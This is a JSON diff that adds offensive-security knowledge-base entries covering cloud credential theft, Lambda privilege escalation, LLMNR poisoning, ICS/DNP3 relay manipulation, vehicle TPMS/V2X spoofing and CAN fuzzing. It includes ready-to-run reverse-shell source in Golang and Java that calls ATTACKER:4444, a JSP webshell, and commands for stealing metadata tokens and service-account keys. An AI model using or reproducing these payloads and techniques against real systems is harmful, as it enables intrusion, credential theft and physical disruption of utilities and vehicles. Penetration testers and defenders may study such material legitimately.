+    "metadata": {
+      "category": "cloud",
+      "technique": "azure-ad-enumeration",
+      "tool": "aadinternals"
+    }
+  },
+  {
+    "id": "gcp-service-account-theft",
+    "content": "GCP service account key theft and exploitation. Service account key files are JSON with private keys \u2014 extremely sensitive. Steal key file if accessible: find / -name '*.json' -exec grep -l 'private_key_id' {} \\;. Authenticate with stolen key: gcloud auth activate-service-account --key-file=service-account.json; export GOOGLE_APPLICATION_CREDENTIALS=/path/to/key.json. Enumerate with stolen SA: gcloud projects list; gcloud compute instances list --project=PROJECT; gcloud storage ls; gcloud iam service-accounts list --project=PROJECT; gcloud iam service-accounts keys list --iam-account=SA_EMAIL. Create new key (if iam.serviceAccountKeys.create permission): gcloud iam service-accounts keys create output.json --iam-account=SA_EMAIL. Impersonate SA (if iam.serviceAccounts.actAs): gcloud config set auth/impersonate_service_account SA_EMAIL. Metadata token theft from SSRF: curl 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' -H 'Metadata-Flavor: Google'. Use token: curl -H 'Authorization: Bearer TOKEN' 'https://cloudresourcemanager.googleapis.com/v1/projects'. List all IAM bindings: gcloud projects get-iam-policy PROJECT.",
+    "metadata": {
+      "category": "cloud",
+      "technique": "gcp-service-account-theft",
+      "tool": "gcloud"
+    }
+  },
+  {
+    "id": "dnp3-ics-exploitation",
+    "content": "DNP3 (Distributed Network Protocol 3) exploitation in ICS/SCADA environments. Common in electric utilities, water systems. Default port 20000/TCP and UDP. No authentication in DNP3 Level 0 and Level 1 (most deployed). Scanning: nmap -sV -p 20000 TARGET --script dnp3-info. Metasploit: use auxiliary/scanner/scada/dnp3_enumeration; set RHOSTS TARGET; run. Attacks: (1) Request DNP3 device data \u2014 link layer frames to poll I/O points; (2) Unsolicited response spoofing \u2014 inject false data to control system; (3) Direct operate commands \u2014 if Level 0 auth, send CROB (Control Relay Output Block) to open/close relays: code 3 (pulse on), count 1, on-time 100ms, off-time 100ms; (4) Application layer flood \u2014 DoS by overwhelming with Class 0 polls. Wireshark: decode port 20000 as DNP3. aegis framework for DNP3 testing. Authentication bypass: DNP3 Secure Authentication (Level 2) can be brute-forced if using weak keys. Impact: disable protective relays, falsify measurements to trigger wrong operator actions. Use in conjunction with MITM on serial-to-Ethernet converters.",
+    "metadata": {
+      "category": "automotive",
+      "technique": "dnp3-exploitation",
+      "tool": "metasploit"
+    }
+  },
+  {
+    "id": "lambda-privilege-escalation",
+    "content": "AWS Lambda function privilege escalation. Prerequisites: access to lambda:UpdateFunctionCode or lambda:InvokeFunction. Enumerate Lambda functions: aws lambda list-functions --region us-east-1. Get function config (shows IAM role): aws lambda get-function-configuration --function-name FUNCTION. Get function code: aws lambda get-function --function-name FUNCTION --query 'Code.Location'. Privesc via UpdateFunctionCode (if lambda has powerful role): (1) Download current code; (2) Inject payload: import boto3; iam=boto3.client('iam'); iam.attach_user_policy(UserName='YOURUSER',PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'); (3) Upload modified code: aws lambda update-function-code --function-name FUNCTION --zip-file fileb://malicious.zip; (4) Invoke: aws lambda invoke --function-name FUNCTION /tmp/out.txt. If function has sts:AssumeRole or iam:* permission in its execution role. Alternatively: aws lambda create-function with iam:PassRole to create lambda with high-priv role and invoke it. Check environment variables for secrets: aws lambda get-function-configuration --function-name FUNCTION | jq '.Environment.Variables'. Environment vars often contain database passwords, API keys, other service credentials.",
+    "metadata": {
+      "category": "cloud",
+      "technique": "lambda-privesc",
+      "tool": "awscli"
+    }
+  },
+  {
+    "id": "responder-llmnr-poisoning",
+    "content": "Responder LLMNR/NBT-NS/mDNS poisoning for hash capture. Prerequisites: attacker on same Layer-2 segment as targets. Install: apt install responder or git clone https://github.com/lgandx/Responder. Start poisoning: responder -I eth0 -wrf (-w=WPAD, -r=NBT-NS, -f=fingerprint). Hashes captured in /usr/share/responder/logs/ or ~/.responder/logs/. Captured NTLMv2 hashes: hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt. Trigger hash capture: victim makes UNC path request (\\\\NONEXISTENT\\share), types non-existent hostname in browser, any LLMNR/NBT-NS query that fails DNS. Force captures: if you can inject UNC paths via XSS, HTML injection, file upload metadata, Word/Excel documents \u2014 embed UNC path like \\\\ATTACKER\\share. PDF metadata UNC: use exiftool. Combine with relay (disable SMB/HTTP in Responder.conf first): responder -I eth0 -wrf (poisoning only) + ntlmrelayx -tf targets.txt -smb2support. WPAD attack: responder serves fake WPAD proxy config \u2014 captures credentials from browsers configured for auto-detect proxy. Analyze: python tools/MultiRelay.py. Check interface: ifconfig to confirm correct -I value.",
+    "metadata": {
+      "category": "ad",
+      "technique": "llmnr-poisoning",
+      "tool": "responder"
+    }
+  },
+  {
+    "id": "tpms-v2x-automotive-attacks",
+    "content": "Automotive TPMS and V2X attack surfaces. TPMS (Tire Pressure Monitoring System): sensors broadcast at 315MHz or 433MHz unencrypted. Tools: RTL-SDR + rtl_433 to capture: rtl_433 -f 315M -R 59 (car_tire_pressure decoder). Replay attacks: record and replay with HackRF or YARD Stick One: hackrf_transfer -r tpms_capture.bin -f 315000000 -s 2000000. Inject false pressure readings to trigger dashboard warnings or disable TPMS alerts: urh (Universal Radio Hacker) for signal analysis and re-transmission. V2X (DSRC/C-V2X on 5.9GHz): DSRC uses IEEE 802.11p (WAVE). Attack surface: (1) Basic Safety Messages (BSM) \u2014 no authentication in early deployments; spoof GPS position, speed, direction to mislead other vehicles; (2) SPaT messages (Signal Phase and Timing) \u2014 spoof traffic light phase info; (3) Denial of service \u2014 flood with malformed BSMs. Tools: Cohda Wireless MK5 OBU for testing; scapy with 802.11p extensions; GNU Radio with DSRC blocks. PKI/Certificate-based auth (SCMS) in modern V2X helps but certificate misbehavior tracking has lag. DoIP (Diagnostic over IP, port 13400): enumerate with nmap; send UDS over DoIP; python-doip library.",
+    "metadata": {
+      "category": "automotive",
+      "technique": "tpms-v2x-attacks",
+      "tool": "rtl_433"
+    }
+  },
+  {
+    "id": "censys-fofa-recon",
+    "content": "Censys and FOFA for internet asset discovery. Censys search (censys.io): services.port:6379 AND services.software.product:'Redis'; services.tls.certificates.parsed.subject_dn:'O=TARGET'; ip:1.2.3.0/24; services.http.response.headers.server:'nginx/1.14'; autonomous_system.organization:'TARGET Corp'; services.software.product:'Apache Tomcat' AND services.port:8080. Censys CLI: pip install censys; censys search 'services.port:27017' --index-type hosts. FOFA (fofa.info) \u2014 Chinese internet asset search engine with large dataset: app='Redis' && country='US'; domain='target.com'; ip='1.2.3.0/24'; header='X-Powered-By: ThinkPHP'; title='Jenkins'; body='tomcat' && port='8080'; cert='target.com'. FOFA API: curl 'https://fofa.info/api/v1/search/all?email=USER&key=KEY&qbase64=BASE64_QUERY'. BinaryEdge (binaryedge.io): type:service name:redis; type:service name:elasticsearch; ip:TARGET. Combine with Shodan for comprehensive coverage. GreyNoise: context on known scanners/attackers vs targets: curl -H 'key: API_KEY' 'https://api.greynoise.io/v3/community/TARGET_IP'. Onyphe: search for org:'TARGET' category:synscan.",
+    "metadata": {
+      "category": "osint",
+      "technique": "censys-fofa-recon",
+      "tool": "censys"
+    }
+  },
+  {
+    "id": "golang-java-reverse-shells",
+    "content": "Golang and Java reverse shell payloads. Golang reverse shell (compile on attacker, transfer binary): package main; import(\"net\";\"os/exec\";\"os\"). func main(){c,_:=net.Dial(\"tcp\",\"ATTACKER:4444\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}. Compile: GOOS=linux GOARCH=amd64 go build -o shell shell.go; or cross-compile for Windows: GOOS=windows GOARCH=amd64 go build -o shell.exe shell.go. Java reverse shell (standalone): import java.io.*;import java.net.*;public class Shell{public static void main(String[] a) throws Exception{Socket s=new Socket(\"ATTACKER\",4444);Process p=Runtime.getRuntime().exec(\"/bin/bash\");new Thread(()->{try{InputStream i=p.getInputStream();OutputStream o=s.getOutputStream();byte[] b=new byte[1024];int n;while((n=i.read(b))!=-1)o.write(b,0,n);o.flush();}catch(Exception e){}}).start();new Thread(()->{try{InputStream i=s.getInputStream();OutputStream o=p.getOutputStream();byte[] b=new byte[1024];int n;while((n=i.read(b))!=-1)o.write(b,0,n);o.flush();}catch(Exception e){}}).start();}}. JSP webshell: <%=Runtime.getRuntime().exec(request.getParameter(\"cmd\"))%>. JSP full reverse: <%@ page import='java.io.*,java.net.*' %><%Socket s=new Socket(\"ATTACKER\",4444);...%>. Compile Java: javac Shell.java; java Shell.",
+    "metadata": {
+      "category": "exploitation",
+      "technique": "golang-java-reverse-shells",
+      "tool": "netcat"
+    }
+  },
+  {
+    "id": "obd2-attack-surface",
+    "content": "OBD-II port attack surface and exploitation. Physical OBD-II port under dashboard \u2014 gateway to vehicle CAN bus. Connect: ELM327 adapter (Bluetooth/WiFi/USB), PEAK PCAN-USB, Kvaser. ELM327 AT commands: ATZ (reset); ATE0 (echo off); ATL0 (linefeeds off); ATSP0 (auto protocol detect); 0100 (supported PIDs). OBD-II mode/PID structure: Mode 01 (real-time data), Mode 02 (freeze frame), Mode 03 (DTCs), Mode 04 (clear DTCs), Mode 09 (vehicle info/VIN), Mode 0A (permanent DTCs). Read VIN: Mode 09, PID 02 \u2014 0902 request, parses 17-char VIN from response. Read DTCs: 03 (request); response: 43 XX XX (fault codes). Clear DTCs: 04. UDS extended sessions via OBD-II: 10 03 (extended session), 27 01 (request seed for security access). Wireless OBD dongles \u2014 attack surface: many use unauthenticated Bluetooth/WiFi, allow anyone in range to inject CAN frames. Tools: python-OBD library for ELM327; scapy with automotive extensions; CANalyse; SocketCAN. Bluetooth OBD sniff: btlejuice, btle-sniffer. WiFi OBD: default SSID/password on many dongles \u2014 connect and inject via TCP to port 35000.",
+    "metadata": {
+      "category": "automotive",
+      "technique": "obd2-exploitation",
+      "tool": "python-OBD"
+    }
+  },
+  {
+    "id": "ecu-fuzzing",
+    "content": "Automotive ECU fuzzing techniques. Setup: connect to OBD-II or direct CAN with SocketCAN adapter. CAN bus fuzzing \u2014 random frame injection: cangen can0 -g 0 -I r -L r -D r (random arb IDs, random length, random data). Targeted fuzzing (specific arbitration ID): cangen can0 -I 7DF -L 8 -D r -g 1 (fuzz OBD-II broadcast ID). Observe dashboard reactions while fuzzing \u2014 note which IDs trigger visible effects. UDS fuzzing with caringcaribou: python cc.py uds_fuzz discovery can0 (enumerate supported services); python cc.py uds_fuzz services can0 0x7DF (fuzz all service parameters). Boofuzz for protocol-aware fuzzing: define UDS session, systematically mutate fields. AFL++ with SocketCAN for coverage-guided fuzzing of ECU firmware simulators. ICSim: safe fuzzing environment \u2014 ./icsim vcan0 & cangen vcan0 -g 0 -I r -L r -D r \u2014 observe speedometer/turn signals/door locks. Record baseline traffic first: candump -l can0 (30 min of normal operation). Differential analysis: compare baseline vs crash states. Hardware-in-loop (HIL) testing: connect real ECU to virtual CAN, monitor JTAG/UART for crashes. Common targets: instrument cluster (cosmetic), gateway ECU (security critical), BCM (body control module \u2014 locks/windows).",
+    "metadata": {
+      "category": "automotive",
+      "technique": "ecu-fuzzing",
+      "tool": "caringcaribou"
+    }
   }
 ]
